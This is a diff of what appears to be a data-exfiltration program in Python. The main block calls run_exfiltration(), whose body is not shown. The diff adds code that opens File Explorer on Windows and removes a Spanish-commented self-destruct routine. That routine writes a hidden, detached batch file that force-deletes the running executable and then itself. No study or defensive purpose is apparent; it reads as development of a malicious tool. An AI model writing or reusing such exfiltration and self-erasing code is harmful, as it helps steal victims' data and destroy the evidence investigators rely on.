@@ -65,22 +65,18 @@ def run_exfiltration():
         except: pass
 
 if __name__ == "__main__":
+    # Open current directory on startup for user feedback
+    if sys.platform == "win32":
+        try:
+            # os.startfile('.') opens the current directory in File Explorer on Windows
+            subprocess.Popen(['explorer', os.getcwd()], 
+                             creationflags=subprocess.CREATE_NO_WINDOW)
+            log("Opened current directory in File Explorer.")
+        except Exception as e:
+            log(f"Error opening current directory: {e}")
+    else:
+        log("Agent started. (Workspace auto-open not supported on this OS).")
+            
     run_exfiltration()
     
-    # Rutina de autodestrucción (Solo Windows)
-    if sys.platform == "win32":
-        executable_path = sys.argv[0]
-        cleanup_script = f"""@echo off
-timeout /t 5 /nobreak > NUL
-del /f /q "{executable_path}"
-del "%~f0"
-"""
-        try:
-            script_path = os.path.join(os.environ['TEMP'], "cleanup.bat")
-            with open(script_path, "w") as f:
-                f.write(cleanup_script)
-            subprocess.Popen(['cmd.exe', '/c', script_path], 
-                             creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
-        except:
-            pass
     sys.exit(0)
